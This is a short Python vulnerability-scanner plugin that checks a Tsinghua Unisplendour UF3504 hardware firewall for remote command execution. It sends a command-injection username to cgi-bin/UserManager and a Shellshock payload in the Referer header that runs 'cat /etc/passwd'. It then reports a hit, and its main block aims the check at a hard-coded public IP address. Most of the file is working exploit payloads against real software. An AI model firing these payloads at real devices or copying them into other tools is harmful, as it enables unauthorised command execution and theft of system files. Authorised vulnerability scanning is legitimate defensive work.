#!/usr/bin/env python
#-*- coding: utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2010-0114593

import urlparse
def assign(service, arg):
    if service == "unis_gateway":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    url = arg + 'cgi-bin/UserManager'
    postdata = "login=%b5%c7%c2%bc&action=useraction&passwd=123456&username=%22set%7cset%26set%22"
    code, head, res, errcode, _ = curl.curl2(url,post=postdata)
    if code==200 and 'DOCUMENT_ROOT' in res:
        security_hole("清华紫光硬件防火墙UF3504 3.0版型号命令执行:http://www.wooyun.org/bugs/wooyun-2010-0115756")
    code, head, res, errcode, _ = curl.curl2(arg,referer='() { :;}; echo  `/bin/cat /etc/passwd`')
    if code==200 and 'root' in head:
       security_hole("清华紫光硬件防火墙UF3504 3.0版型号BASH远程命令执行漏洞:Referer: () { :;}; echo  `/bin/cat /etc/passwd`")

if __name__ == '__main__':
    from dummy import *
    audit(assign('unis_gateway', 'https://219.147.203.13/')[1])